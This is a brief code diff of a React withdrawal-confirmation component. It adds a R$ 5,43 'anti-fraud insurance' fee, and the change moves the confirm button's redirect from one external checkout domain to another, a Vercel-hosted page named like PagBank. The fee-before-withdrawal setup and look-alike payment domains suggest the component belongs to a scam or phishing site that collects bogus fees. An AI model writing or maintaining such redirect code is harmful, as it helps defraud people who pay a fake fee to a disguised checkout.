@@ -82,7 +82,7 @@ export function WithdrawalConfirmation({
   const antifraudInsurance = 543 // R$ 5,43
 
   const handleConfirm = () => {
-    window.location.href = "https://compraonlinesegurada.org.ua/c/63fdab9b0b"
+    window.location.href = "https://instmepaybank.vercel.app/checkout/pagbankinstal"
   }
 
   return (
